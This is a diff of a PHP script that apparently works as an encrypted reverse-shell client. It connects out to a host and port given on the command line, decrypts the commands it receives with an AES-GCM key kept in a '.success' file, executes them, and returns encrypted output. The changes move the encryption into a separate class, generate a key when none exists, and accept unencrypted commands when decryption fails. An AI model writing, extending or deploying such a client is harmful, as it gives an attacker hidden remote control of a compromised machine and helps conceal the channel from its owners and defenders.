@@ -1,7 +1,5 @@
-#!/usr/bin/php -q
+#!/usr/bin/php -d memory_limit=2048M
 <?php
-
-	//error_reporting(0);
 	set_time_limit(0);
 	ob_implicit_flush(1);
 
@@ -12,30 +10,30 @@
 	);
 	$opts  = getopt($short,$long);
 
-
-	if(count($opts) < 2){
-		die("Assign remote ip [-h/--host] and port [-p/--port]\n");
-	}
+	(count($opts) === 2) or die("Assign remote ip [-h/--host] and port [-p/--port]\n");
 
 	$addr 	= array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
 	$port 	= array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);
 
-	if (($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
-	     die("[\33[91m!\33[0m] socket_create() failed: reason: " .socket_strerror(socket_last_error())."\n");
-	}
+	($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) or die("[\33[91m!\33[0m] socket_create() failed: reason: " .socket_strerror(socket_last_error())."\n");
 
 	echo "Connecting to [".$addr.":".$port."]...\n";
 
-	if ((@$result = socket_connect($socket, $addr, $port)) === false){
-	    die("[\33[91m!\33[0m] socket_connect failed: reason: " .socket_strerror(socket_last_error($socket))."\n");
-	} 
+	(@$result = socket_connect($socket, $addr, $port)) or die("[\33[91m!\33[0m] socket_connect failed: reason: " .socket_strerror(socket_last_error($socket))."\n");
 
-	$key = file_get_contents(".success");
-	define('KEY',$key);
-	define('CYPHER', 'aes-256-gcm');
+	require_once 'Openssl_EncryptDecrypt.php';
+	if(!file_exists('.success')){
+		$key = base64_encode(bin2hex(openssl_random_pseudo_bytes(32)));
+		file_put_contents('.success', $key);
+		echo "!! auth key is missing !!\n";
+	} else {
+		$key = file_get_contents(".success");
+	}
+	$openssl_encrypt_decrypt = new Openssl_EncryptDecrypt;
+	define('ENCRYPTION_KEY', $key);
+
 
 	echo "\33[32mConnected to host [".$addr.":".$port."]\33[0m\n";
-
 	while (true) {
 
 		$now = date('d/m H:i:s');
@@ -64,8 +62,11 @@
 	    }
 	    else
 	    {
-	    	$recv = __decrypt($recv);
-
+			$temp_recv = $recv;
+			$recv = $openssl_encrypt_decrypt->decrypt($recv, ENCRYPTION_KEY);
+			if($recv === null){
+				$recv = $temp_recv;
+			}
 
 	    	if (preg_match('/(dc)/', $recv, $matches, PREG_OFFSET_CAPTURE))
 	    	{
@@ -132,7 +133,8 @@
 			
 
 			$result .= "\n\rexecuted:: $fnc\n\rcmd:: $full_cmd";
-			$result = __encrypt($result);
+			$result = $openssl_encrypt_decrypt->encrypt($result, ENCRYPTION_KEY);
+
 
     		if(socket_write($socket, $result ,strlen($result)) === false)
     		{	
@@ -143,35 +145,4 @@
 	echo "Closing socket.\n";
 	socket_close($socket);
 	exit(0);
-
-	
-	/*:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::*/
-
-
-	function __encrypt($message)
-	{
-		$msg = base64_encode($message);
-
-		if(in_array(CYPHER, openssl_get_cipher_methods()))
-		{
-			$ivlen     = openssl_cipher_iv_length(CYPHER);
-			$iv        = openssl_random_pseudo_bytes($ivlen);
-			$cyphertxt = openssl_encrypt($msg, CYPHER, KEY, $options=0, $iv, $tag);
-		}
-
-	    return base64_encode($cyphertxt).':'.bin2hex($iv).':'.bin2hex($tag);
-	}
-
-	function __decrypt($input)
-	{
-		$encrypted  = explode(":", $input);
-		
-		$cyphertext =  base64_decode($encrypted[0]);
-		$iv         =  hex2bin($encrypted[1]);
-		$tag        =  hex2bin($encrypted[2]);
-
-		$original = openssl_decrypt($cyphertext, CYPHER, KEY, $options=0, $iv, $tag);
-
-		return base64_decode($original);
-	}
 ?>
